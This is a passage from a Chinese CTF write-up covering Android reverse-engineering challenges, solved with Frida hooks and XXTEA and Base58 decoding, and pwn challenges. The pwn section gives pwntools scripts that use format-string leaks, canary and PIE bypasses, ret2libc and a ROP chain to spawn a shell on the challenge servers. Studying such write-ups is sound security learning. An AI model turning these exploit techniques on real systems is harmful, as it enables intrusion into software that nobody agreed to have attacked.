class="string">&quot;message&quot;</span>, message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>dex发现<code>(52 / (length + 1)) + 6; 1640531527</code></p>
<p>是xxtea加密</p>
<p>key在native中</p>
<p>跑下脚本 调试getKey得密钥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function main() &#123;</span></span><br><span class="line"><span class="string">    Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">        var ClassUse = Java.use(&quot;java.lang.Class&quot;);</span></span><br><span class="line"><span class="string">        var dexclassLoader = Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span></span><br><span class="line"><span class="string">        dexclassLoader.loadClass.overload(&quot;java.lang.String&quot;, &quot;boolean&quot;).implementation =</span></span><br><span class="line"><span class="string">            function (name, initialize) &#123;</span></span><br><span class="line"><span class="string">                console.log(&quot;Loading class:&quot;, name);  // Debug: 输出尝试加载的类名</span></span><br><span class="line"><span class="string">                var result = this.loadClass(name, initialize);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (name === &quot;com.example.challengemobile.Checker&quot;) &#123;</span></span><br><span class="line"><span class="string">                    console.log(&quot;Found target class:&quot;, name);  // Debug: 确认找到目标类</span></span><br><span class="line"><span class="string">                    var hookClass = result;</span></span><br><span class="line"><span class="string">                    var hookClassCast = Java.cast(hookClass, ClassUse);</span></span><br><span class="line"><span class="string">                    try &#123;</span></span><br><span class="line"><span class="string">                        var method = hookClassCast.getMethod(&quot;getKey&quot;, []);</span></span><br><span class="line"><span class="string">                        var keyResult = method.invoke(null, []);</span></span><br><span class="line"><span class="string">                        console.log(&quot;Key obtained:&quot;, keyResult);  // 输出getKey的结果</span></span><br><span class="line"><span class="string">                        return keyResult;</span></span><br><span class="line"><span class="string">                    &#125; catch (e) &#123;</span></span><br><span class="line"><span class="string">                        console.log(&quot;Error during method invocation:&quot;, e);  // 如果getMethod或invoke出错，输出错误信息</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                return result;</span></span><br><span class="line"><span class="string">            &#125;;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">setImmediate(main);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span> (message, data):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;challengemobile&#x27;</span>)</span><br><span class="line">script= process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>最后XXTea解密得flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xxtea</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填入数据</span></span><br><span class="line">key1 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">encrypted_data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">decrypted_data = xxtea.decrypt(encrypted_data, key,padding=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_data)</span><br></pre></td></tr></table></figure>



<h4 id="ohHELP"><a href="#ohHELP" class="headerlink" title="ohHELP"></a>ohHELP</h4><p>jadx打开看下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfc23b59.png" alt="image-20240525124424353"></p>
<p>研究下 发现a.a()会产生空异常，跟一下，发现GetKey返回为null</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfbeda6b.png" alt="image-20240525124537097"></p>
<p>同时可以在ssh下找到个key</p>
<p>frida对其进行设置返回值后可以看到其在调用property的时候退出，这时需要我们再次手动设置一下对应的返回值信息：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfc1e799.png" alt="image-20240525124640143"></p>
<p>然后我们的Hook AesUtil.encrypt就不会有错误而退出</p>
<p>但是GetTime返回的又是现在的一个时间戳，需要再次设置一下目标时间</p>
<p>然后再次hook便可以得到flag</p>
<p>frida写脚本：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">Myjni</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.ohhelp.MyJNI.Myjni&quot;</span>);</span><br><span class="line"><span class="title class_">Myjni</span>[<span class="string">&quot;GetKey&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;GetKey is called&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> ret = <span class="variable language_">this</span>.<span class="title class_">GetKey</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;GetKey ret value is &#x27;</span> + ret);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;PUDzbflthjqxlJVW&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">System</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.System&#x27;</span>);</span><br><span class="line"><span class="title class_">System</span>.<span class="property">getProperty</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">propertyName</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> returnValue = <span class="variable language_">this</span>.<span class="title function_">getProperty</span>(propertyName);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;System.getProperty called with propertyName: &quot;</span> + propertyName + <span class="string">&quot;, returned: &quot;</span> + returnValue);</span><br><span class="line">    <span class="keyword">if</span> (propertyName === <span class="string">&quot;java.vm.vendor&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> returnValue;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Myjni</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.ohhelp.MyJNI.Myjni&quot;</span>);</span><br><span class="line"><span class="title class_">Myjni</span>[<span class="string">&quot;GetTime&quot;</span>].<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;GetTime is called&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> ret = <span class="variable language_">this</span>.<span class="title class_">GetTime</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;GetTime ret value is &#x27;</span> + ret);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1055853128000&quot;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<h3 id="擂台题-3"><a href="#擂台题-3" class="headerlink" title="擂台题"></a>擂台题</h3><h4 id="上春山"><a href="#上春山" class="headerlink" title="上春山"></a>上春山</h4><p>附件下载下来是一个apk</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfb3dda7.png" alt="image-20240525132020469"></p>
<p>但是jadx打开出来不行</p>
<p>这里我们需要把它改成zip</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfb3bd77.png" alt="image-20240525132301889"></p>
<p>在里面找到一个.so文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfb2f765.png" alt="image-20240525132453208"></p>
<p>IDA打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfb88ddf.png" alt="image-20240525132525771"></p>
<p>研究了一下</p>
<p>写了个脚本</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> *v4; <span class="comment">// r14</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *v3 = <span class="string">&quot;999&quot;</span>; <span class="comment">// 手动给 v3 赋值为 &quot;999&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;999&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        v4 = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">1</span>]; <span class="comment">// 使用 new 分配内存</span></span><br><span class="line">        <span class="type">char</span> v5 = <span class="built_in">strlen</span>(v3); <span class="comment">// 使用 strlen 获取字符串长度</span></span><br><span class="line">        *v4 = v5 + <span class="built_in">strlen</span>(<span class="string">&quot;dtJFkgiuTWcFBdgeGh&quot;</span>) + <span class="number">5</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(v4, <span class="string">&quot;flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(v4, v3);</span><br><span class="line">        <span class="built_in">strcat</span>(v4, <span class="string">&quot;dtJFkgiuTWcFBdgeGh&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出拼接后的字符串</span></span><br><span class="line">        std::cout &lt;&lt; v4 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 释放动态分配的内存</span></span><br><span class="line">        <span class="keyword">delete</span>[] v4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfb33992.png" alt="image-20240525132746110"></p>
<h4 id="EzArd"><a href="#EzArd" class="headerlink" title="EzArd"></a>EzArd</h4><p>jadx打开</p>
<p>看到这段代码是将时间流转换成字符流</p>
<p>调试</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfb9caf5.png" alt="image-20240525152122474"></p>
<p>动态调试得</p>
<p>字符串 3SRNH1pdcta4283rFzAHxvZOLjIizbJ64UFx</p>
<p>加密：异或、换位、base64换表</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfc1c997.png" alt="image-20240525152231525"></p>
<p>然后逐位爆破输出解密字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 Base58 字符集</span></span><br><span class="line">BASE58_ALPHABET = <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 待解码的消息</span></span><br><span class="line">ENCODED_MESSAGE = <span class="string">&quot;3SRNH1pdcta4283rFzAHxvZOLjIizbJ64UFx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化解码结果列表，长度与原消息相同</span></span><br><span class="line">decoded_results = [<span class="string">&quot;1&quot;</span>] * <span class="built_in">len</span>(ENCODED_MESSAGE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base58_to_decimal</span>(<span class="params">encoded_string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将 Base58 编码的字符串转换为其十进制表示。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    base = <span class="number">58</span></span><br><span class="line">    decimal_value = <span class="number">0</span></span><br><span class="line">    power = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">reversed</span>(encoded_string):</span><br><span class="line">        digit = BASE58_ALPHABET.index(char)</span><br><span class="line">        decimal_value += digit * (base ** power)</span><br><span class="line">        power += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> decimal_value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历偏移量 k，尝试解码</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 重新初始化解码结果列表，避免之前迭代的影响</span></span><br><span class="line">        decoded_chars = [<span class="string">&quot;1&quot;</span>] * <span class="built_in">len</span>(ENCODED_MESSAGE)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 解码过程</span></span><br><span class="line">        <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(ENCODED_MESSAGE):</span><br><span class="line">            <span class="keyword">if</span> char.isdigit():</span><br><span class="line">                decoded_chars[index] = char</span><br><span class="line">            <span class="keyword">elif</span> char.islower():</span><br><span class="line">                decoded_chars[index] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="number">97</span> + offset) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">            <span class="keyword">elif</span> char.isupper():</span><br><span class="line">                decoded_chars[index] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="number">65</span> + offset) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 合并解码后的字符列表为字符串</span></span><br><span class="line">        modified_message = <span class="string">&quot;&quot;</span>.join(decoded_chars)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 转换为十进制并尝试打印解码结果</span></span><br><span class="line">        <span class="built_in">print</span>(offset, long_to_bytes(base58_to_decimal(modified_message)))</span><br><span class="line">    <span class="keyword">except</span> ValueError:  <span class="comment"># 更具体的异常处理，当字符不在 BASE58 集合中时抛出</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcfbec300.png" alt="image-20240525152433984"></p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="练武题-4"><a href="#练武题-4" class="headerlink" title="练武题"></a>练武题</h3><h4 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h4><p>先看看这个程序是个怎么个事</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd2594713.png" alt="image-20240525015440133"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd24db6aa.png" alt="image-20240525015500714"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd25c14c6.png" alt="image-20240525015515551"></p>
<p>用IDA打开康康呢</p>
<p>发现存在system函数</p>
<p>是在sub_400C8A函数进行调用的</p>
<p>跟进一下看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd2505b67.png" alt="image-20240525015630200"></p>
<p>这样思路就很清楚了</p>
<p>开始申请又释放了一个chunk(ptr)，后面又申请了一个v1的chunk，又将释放的chunk和Flag进行了对比，如果相等则会执行后门函数，申请的chunk大小可控，如果大小为第一个chunk的大小然后发送Flag为其内容即可获得shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;xxxx&quot;</span>,[port])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choice&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Chunk size&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;104&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;Flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd245418a.png" alt="image-20240525015811626"></p>
<h4 id="ISCC-easy"><a href="#ISCC-easy" class="headerlink" title="ISCC_easy"></a>ISCC_easy</h4><p>IDA打开看看</p>
<p>发现存在字符串漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd25a4f25.png" alt="image-20240525020053482"></p>
<p>简单看看</p>
<p>如果在 printf 函数中，如果字符串 s 中包含格式化字符串</p>
<p>可以控制输入的格式化字符串来达到读取或修改内存的目的</p>
<p>而没有binsh、system函数 证明我们需要自己构造</p>
<p>可以通过libc基址进行计算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;xxxx&#x27;</span>,[port])</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6-i386_2.31-0ubuntu9.14_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Let&#x27;s have fun!\n&quot;</span>)</span><br><span class="line">x = <span class="number">0x804C030</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>, &#123;x: <span class="number">5</span>&#125;) + <span class="string">b&#x27;%15$p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">libcbase = libc_addr - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">0XF5</span></span><br><span class="line">log.info(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x90</span> + <span class="number">0x4</span>) + p32(system) + p32(<span class="number">0x0</span>) + p32(str_bin_sh)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd2452fd5.png" alt="image-20240525020427652"></p>
<h4 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h4><p>IDA打开</p>
<p>发现func函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd25acdbc.png" alt="image-20240525020639276"></p>
<p>研究一下</p>
<p>发现有一个溢出和fmt漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd23d8ee6.png" alt="image-20240525020717035"></p>
<p>并且 还有后面函数</p>
<p>所以思路就很清楚了</p>
<p>先用fmt漏洞使泄露出canary和elf地址  接着就是ret2text</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;xxxx&#x27;</span>,[port])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./easyshell&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">pay=<span class="string">b&#x27;flagisaaa%15$p%17$p&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">pie=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1422</span>-<span class="number">254</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">pay=(<span class="string">b&#x27;exit&#x27;</span>).ljust(<span class="number">0x38</span>)+p64(canary)*<span class="number">2</span>+p64(pie+<span class="number">0x1291</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd25927e7.png" alt="image-20240525021237719"></p>
<h4 id="miao"><a href="#miao" class="headerlink" title="miao"></a>miao</h4><p>IDA打开</p>
<p>简单审计后 发现有格式化字符串漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd23ea8df.png" alt="image-20240525021623711"></p>
<p>并且还有栈溢出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd258aad6.png" alt="image-20240525021707291"></p>
<p>所以：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&quot;./miao&quot;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;xxxx&quot;</span>,[port])</span><br><span class="line">io.recvuntil(<span class="string">b&quot;?\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;%31$p&quot;</span>) </span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">eax=<span class="number">0x080b8666</span></span><br><span class="line">ebx_edx=<span class="number">0x0806f309</span></span><br><span class="line">ecx=<span class="number">0x080def3d</span></span><br><span class="line">bin_sh=<span class="number">0x80BB7C8</span></span><br><span class="line">int_80=<span class="number">0x0806cf83</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x64</span>+p32(canary)</span><br><span class="line">payload=payload.ljust(<span class="number">0x74</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload+=p32(eax)+p32(<span class="number">0xb</span>)+p32(ebx_edx)+p32(bin_sh)+p32(<span class="number">0</span>)+p32(ecx)+p32(<span class="number">0</span>)+p32(int_80)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd24592e6.png" alt="image-20240525021808233"></p>
<h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p>IDA打开发现使格式化字符串</p>
<p>看看怎么个事</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd25206e9.png" alt="image-20240525022044106"></p>
<p>所以 我们通过格式化字符串泄露找到libc地址</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd2496cea.png" alt="image-20240525022206320"></p>
